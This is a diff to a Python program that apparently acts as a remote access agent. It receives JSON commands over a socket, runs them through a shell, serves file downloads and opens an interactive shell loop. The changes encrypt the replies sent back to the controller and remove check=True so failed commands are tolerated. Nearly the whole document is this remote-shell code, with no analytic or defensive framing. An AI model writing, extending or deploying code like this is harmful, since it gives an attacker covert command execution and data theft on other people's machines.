@@ -46,7 +46,7 @@ def main():
             if data['type'] == "command":
 
                 command = data['action']
-                result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
                 response = json.dumps({
                     'status': 'OK',
@@ -55,7 +55,7 @@ def main():
 
                 print(response)
 
-                conn.sendall(response)
+                conn.sendall(cipher.encrypt_message(response))
 
             elif data['type'] == "download":
                 if not os.path.exists(data['action']):
@@ -96,6 +96,7 @@ def main():
                         'status': 'OK',
                         'response': 'Shell open'
                 }).encode('utf-8')
+                print(response)
                 conn.sendall(cipher.encrypt_message(response))
                 while True:
                     listen = listener.listen()
@@ -112,7 +113,7 @@ def main():
                         
                     else:
                         # result = subprocess.check_output(command)
-                        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                         response = json.dumps({
                             'status': 'OK',
                             'response': result.stdout
